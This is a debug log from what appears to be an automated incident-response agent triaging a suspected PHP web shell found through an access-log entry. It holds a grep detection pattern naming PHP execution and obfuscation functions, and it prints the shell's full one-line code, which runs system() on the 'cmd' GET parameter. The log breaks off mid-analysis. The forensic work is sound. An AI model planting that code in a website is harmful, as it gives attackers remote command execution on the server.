2026-05-25 08:27:24.624 | INFO     | threatpipe                | L117  | ======================================================================
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L157  |   raw   : 192.168.1.55 - - [16/Apr/2026:02:14:57] "GET /uploads/shell.php?cmd=ps+aux HTTP/1.1" 200 874
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L158  | ── TRIGGER PARSED ───────────────────────────────────────
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   trigger_type         : web_log
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   entity               : /uploads/shell.php
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   src_ip               : 192.168.1.55
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   timestamp_raw        : 16/Apr/2026:02:14:57
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   timestamp_dt         : 2026-04-16 02:14:57+00:00
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   http_method          : GET
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   http_status          : 200
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   artifact_path        : /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   artifact_type        : php_file
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L160  |   claim                : File '/uploads/shell.php' was accessed via GET from 192.168.1.55 at 02:14:57 UTC (HTTP 200) with query '?cmd=ps+aux'
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.trigger_parser | L161  | ─────────────────────────────────────────────────────────
2026-05-25 08:29:36.509 | INFO     | threatpipe.agent          | L80   | Parsed trigger: type=web_log  entity=/uploads/shell.php  artifact_type=php_file
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.agent          | L84   |   claim         : File '/uploads/shell.php' was accessed via GET from 192.168.1.55 at 02:14:57 UTC (HTTP 200) with query '?cmd=ps+aux'
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.agent          | L85   |   artifact_path : /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.agent          | L86   |   src_ip        : 192.168.1.55
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.agent          | L87   |   http_method   : GET  status=200
2026-05-25 08:29:36.509 | INFO     | threatpipe.evidence_graph | L87   | EvidenceGraph init — db=threatpipe_evidence.db  session=stream_16_20260525_025936
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.evidence_graph | L103  | SQLite connected  path=threatpipe_evidence.db  elapsed=0.4ms
2026-05-25 08:29:36.509 | DEBUG    | threatpipe.evidence_graph | L116  | SQLite tables OK (nodes, edges)
2026-05-25 08:29:36.510 | INFO     | threatpipe.evidence_graph | L166  | Graph session loaded — nodes=0  edges=0  session=stream_16_20260525_025936  elapsed=0.1ms
2026-05-25 08:29:36.510 | DEBUG    | threatpipe.evidence_graph | L189  | ADD NODE  id=trigger:uploads_shell_php_025936  type=trigger  label=/uploads/shell.php
2026-05-25 08:29:36.510 | DEBUG    | threatpipe.evidence_graph | L190  |   data keys : ['raw_log', 'trigger_type', 'src_ip', 'timestamp_raw', 'http_method', 'http_status', 'claim', 'artifact_type', 'artifact_path']
2026-05-25 08:29:36.631 | DEBUG    | threatpipe.evidence_graph | L226  | GRAPH ADD      node=trigger:uploads_shell_php_025936  attrs={'type': 'trigger', 'elapsed_ms': '121.3'}
2026-05-25 08:29:36.631 | DEBUG    | threatpipe.agent          | L226  | GRAPH WRITE    node=trigger:uploads_shell_php_025936  attrs={'stage': 'parse_trigger'}
2026-05-25 08:29:36.703 | INFO     | threatpipe.evidence_graph | L405  | GRAPH SAVED  nodes=1  edges=0  db=threatpipe_evidence.db
2026-05-25 08:29:36.703 | DEBUG    | threatpipe.evidence_graph | L414  | SQLite connection closed  db=threatpipe_evidence.db
2026-05-25 08:29:36.703 | INFO     | threatpipe.agent          | L146  | ────────────────────────────────────────────────────────────
2026-05-25 08:29:36.703 | INFO     | threatpipe.agent          | L147  | STAGE 2 ▶  ARTIFACT LOCATE
2026-05-25 08:29:36.703 | INFO     | threatpipe.agent          | L151  | ────────────────────────────────────────────────────────────
2026-05-25 08:29:36.703 | INFO     | threatpipe.agent          | L127  | Locating artifact: /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.704 | INFO     | threatpipe.agent          | L142  |   ✓ found  size=59B  perms=0o100664
2026-05-25 08:29:36.704 | INFO     | threatpipe.evidence_graph | L87   | EvidenceGraph init — db=threatpipe_evidence.db  session=stream_16_20260525_025936
2026-05-25 08:29:36.704 | DEBUG    | threatpipe.evidence_graph | L103  | SQLite connected  path=threatpipe_evidence.db  elapsed=0.4ms
2026-05-25 08:29:36.704 | DEBUG    | threatpipe.evidence_graph | L116  | SQLite tables OK (nodes, edges)
2026-05-25 08:29:36.704 | INFO     | threatpipe.evidence_graph | L166  | Graph session loaded — nodes=1  edges=0  session=stream_16_20260525_025936  elapsed=0.1ms
2026-05-25 08:29:36.704 | DEBUG    | threatpipe.evidence_graph | L189  | ADD NODE  id=artifact:uploads_shell_php_025936  type=artifact  label=shell.php
2026-05-25 08:29:36.704 | DEBUG    | threatpipe.evidence_graph | L190  |   data keys : ['artifact_path', 'artifact_type', 'exists_on_disk', 'size_bytes', 'permissions', 'missing_reason']
2026-05-25 08:29:36.836 | DEBUG    | threatpipe.evidence_graph | L226  | GRAPH ADD      node=artifact:uploads_shell_php_025936  attrs={'type': 'artifact', 'elapsed_ms': '132.0'}
2026-05-25 08:29:36.836 | DEBUG    | threatpipe.evidence_graph | L248  | ADD EDGE  artifact:uploads_shell_php_025936 ──[triggered_by]──▶ trigger:uploads_shell_php_025936
2026-05-25 08:29:36.877 | DEBUG    | threatpipe.evidence_graph | L229  | GRAPH ADD      edge=artifact:uploads_shell_php_025936→trigger:uploads_shell_php_025936  attrs={'relation': 'triggered_by', 'elapsed_ms': '40.9'}
2026-05-25 08:29:36.878 | DEBUG    | threatpipe.agent          | L226  | GRAPH WRITE    node=artifact:uploads_shell_php_025936  attrs={'exists': True}
2026-05-25 08:29:36.909 | INFO     | threatpipe.evidence_graph | L405  | GRAPH SAVED  nodes=2  edges=1  db=threatpipe_evidence.db
2026-05-25 08:29:36.909 | DEBUG    | threatpipe.evidence_graph | L414  | SQLite connection closed  db=threatpipe_evidence.db
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L146  | ────────────────────────────────────────────────────────────
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L147  | STAGE 3 ▶  TOOL EXECUTION
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L150  |   cycle                : 0
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L151  | ────────────────────────────────────────────────────────────
2026-05-25 08:29:36.910 | INFO     | threatpipe.tool_selector  | L334  | TOOL SELECTION  artifact_type=php_file  trigger_type=web_log  cycle=0
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L338  |   artifact_path : /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.config         | L134  | Tool path lookup: strings → strings
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L284  |   built: strings -n 6 /tmp/threatpipe_evidence/www/uploads/shell.php  [static_analysis]
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.config         | L134  | Tool path lookup: grep → grep
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L284  |   built: grep -aiE eval\(|base64_decode\(|system\(|exec\(|shell_exec\(|passthru\(|popen\(|assert\(|str_rot13|gzinflate|gzuncompress|_REQUEST|_COOKIE|chr\( /tmp/threatpipe_evidence/www/uploads/shell.php  [php_obfuscation]
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.config         | L134  | Tool path lookup: file → file
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L284  |   built: file /tmp/threatpipe_evidence/www/uploads/shell.php  [file_identification]
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.config         | L134  | Tool path lookup: sha256sum → sha256sum
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L284  |   built: sha256sum /tmp/threatpipe_evidence/www/uploads/shell.php  [hashing]
2026-05-25 08:29:36.910 | INFO     | threatpipe.tool_selector  | L374  |   → strings  [static_analysis]
2026-05-25 08:29:36.910 | INFO     | threatpipe.tool_selector  | L375  |     rationale : Dump printable strings — reveals system(), exec(), base64_decode(), eval(), preg_replace /e modifier
2026-05-25 08:29:36.910 | INFO     | threatpipe.tool_selector  | L376  |     hypothesis: PHP web shell — expect execution functions, base64 blobs, or obfuscated payloads
2026-05-25 08:29:36.910 | DEBUG    | threatpipe.tool_selector  | L377  |     fallbacks : ['grep', 'file', 'sha256sum']
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L189  | ── TOOL SELECTED ────────────────────────────────────────────
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L190  |   tool      : strings
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L191  |   args      : -n 6 /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L192  |   category  : static_analysis
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L193  |   rationale : Dump printable strings — reveals system(), exec(), base64_decode(), eval(), preg_replace /e modifier
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L194  |   hypothesis: PHP web shell — expect execution functions, base64 blobs, or obfuscated payloads
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L195  |   fallbacks : ['grep', 'file', 'sha256sum']
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L196  | ────────────────────────────────────────────────────────────
2026-05-25 08:29:36.910 | INFO     | threatpipe.agent          | L167  | TOOL EXEC  ▶  strings -n 6 /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.911 | DEBUG    | threatpipe.agent          | L168  |   tool      : strings
2026-05-25 08:29:36.911 | DEBUG    | threatpipe.agent          | L169  |   args      : ['-n', '6', '/tmp/threatpipe_evidence/www/uploads/shell.php']
2026-05-25 08:29:36.911 | DEBUG    | threatpipe.agent          | L170  |   cwd       : /home/anand/Documents/agentic ai /threatpipe
2026-05-25 08:29:36.911 | INFO     | threatpipe.mcp_tools      | L130  | MCP EXEC: strings -n 6 /tmp/threatpipe_evidence/www/uploads/shell.php
2026-05-25 08:29:36.912 | INFO     | threatpipe.mcp_tools      | L154  | MCP DONE: strings  [OK]  1ms  truncated=False
2026-05-25 08:29:36.912 | INFO     | threatpipe.agent          | L177  | TOOL RESULT ◀  strings  [OK]  1.4ms
2026-05-25 08:29:36.912 | DEBUG    | threatpipe.agent          | L181  | ── STDOUT ───────────────────────────────────────────────
2026-05-25 08:29:36.912 | DEBUG    | threatpipe.agent          | L183  |   if(isset($_GET['cmd'])) { system($_GET['cmd']); }
2026-05-25 08:29:36.912 | DEBUG    | threatpipe.agent          | L184  | ────────────────────────────────────────────────────────
2026-05-25 08:29:36.912 | INFO     | threatpipe.evidence_graph | L87   | EvidenceGraph init — db=threatpipe_evidence.db  session=stream_16_20260525_025936
2026-05-25 08:29:36.913 | DEBUG    | threatpipe.evidence_graph | L103  | SQLite connected  path=threatpipe_evidence.db  elapsed=0.3ms
2026-05-25 08:29:36.913 | DEBUG    | threatpipe.evidence_graph | L116  | SQLite tables OK (nodes, edges)
2026-05-25 08:29:36.913 | INFO     | threatpipe.evidence_graph | L166  | Graph session loaded — nodes=2  edges=1  session=stream_16_20260525_025936  elapsed=0.1ms
2026-05-25 08:29:36.913 | DEBUG    | threatpipe.evidence_graph | L189  | ADD NODE  id=tool_exec:strings_c0_025936  type=tool_execution  label=strings (cycle 0)
